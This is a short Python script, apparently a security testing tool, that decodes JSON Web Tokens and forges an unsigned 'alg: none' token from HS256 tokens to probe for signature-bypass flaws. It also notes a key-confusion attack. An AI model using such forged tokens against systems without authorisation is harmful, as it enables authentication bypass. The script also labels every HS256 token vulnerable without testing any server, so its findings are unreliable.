#!/usr/bin/env python3
"""JWT Manipulator

Tests JWT tokens for vulnerabilities:
- Algorithm confusion (HS256 → none)
- Key confusion attacks
- Signature bypass
"""

import base64
import json
from typing import Dict, Any, Optional


def decode_jwt(token: str) -> Dict[str, Any]:
    """Decode JWT token
    
    Args:
        token: JWT token string
        
    Returns:
        Dict with header, payload, signature
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}
        
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2]
        }
    except Exception as e:
        return {"error": str(e)}


def test_algorithm_confusion(token: str) -> Dict[str, Any]:
    """Test for algorithm confusion (HS256 → none)
    
    Args:
        token: JWT token
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "algorithm_confusion",
        "vulnerable": False,
        "evidence": None
    }
    
    decoded = decode_jwt(token)
    if "error" in decoded:
        return result
    
    header = decoded.get("header", {})
    alg = header.get("alg", "")
    
    # If using HS256, try changing to none
    if alg.upper() == "HS256":
        # Create new token with alg=none
        new_header = header.copy()
        new_header["alg"] = "none"
        
        # Encode new token (no signature needed for none)
        new_header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded["payload"]).encode()).decode().rstrip("=")
        new_token = f"{new_header_b64}.{payload_b64}."
        
        result["vulnerable"] = True
        result["evidence"] = {
            "original_alg": alg,
            "manipulated_token": new_token,
            "note": "Algorithm changed to 'none' - test if server accepts unsigned token"
        }
    
    return result


def test_key_confusion(token: str, public_key: Optional[str] = None) -> Dict[str, Any]:
    """Test for key confusion attacks
    
    Args:
        token: JWT token
        public_key: Optional public key
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "key_confusion",
        "vulnerable": False,
        "evidence": None
    }
    
    decoded = decode_jwt(token)
    if "error" in decoded:
        return result
    
    header = decoded.get("header", {})
    
    # Check if using RS256 but server might accept HS256 with public key
    if header.get("alg", "").upper() == "RS256":
        result["note"] = "Token uses RS256 - test if server accepts HS256 with public key as secret"
    
    return result


def validate_jwt(token: str) -> Dict[str, Any]:
    """Validate JWT token for vulnerabilities
    
    Args:
        token: JWT token
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Test algorithm confusion
    alg_result = test_algorithm_confusion(token)
    results["tests_run"] += 1
    if alg_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(alg_result)
    
    # Test key confusion
    key_result = test_key_confusion(token)
    results["tests_run"] += 1
    if key_result.get("vulnerable"):
        results["vulnerable"] = True
        results["findings"].append(key_result)
    
    return results

